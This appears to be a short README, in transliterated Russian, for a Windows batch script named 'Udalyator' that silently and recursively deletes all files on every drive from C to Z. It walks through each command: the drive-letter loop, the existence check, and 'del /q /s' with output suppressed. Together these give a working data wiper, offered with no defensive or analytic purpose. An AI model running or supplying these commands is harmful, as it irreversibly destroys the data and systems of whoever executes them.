# Udalyator
Etot skript napisan na yazyke paketnykh faylov Windows i prednaznachen dlya udaleniya vsekh faylov s diskov (C-Z), yesli oni sushchestvuyut.
Podrobnoye opisaniye raboty skripta:

1. @echo off: Eta stroka otklyuchayet vyvod komand na ekran, delaya vypolneniye skripta boleye chistym.
2. for %%d in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (...): Etot tsikl perebiraet bukvy diskov ot C do Z.
3. if exist %%d:\ (...): Proveryayet sushchestvovaniye diska %%d (naprimer, C:, D:\ i t.d.).
4. del /q /s %%d:\*.* >nul 2>&1: Udalet vse fayly na diske %%d bez zaprosa podtverzhdeniya (/q) i rekursivno (/s). Rezultaty operatsii vyvodyatsya v nulevoye ustroystvo (nul) i oshibki perenapravlyayutsya v standartnyy vyvod (2>&1).
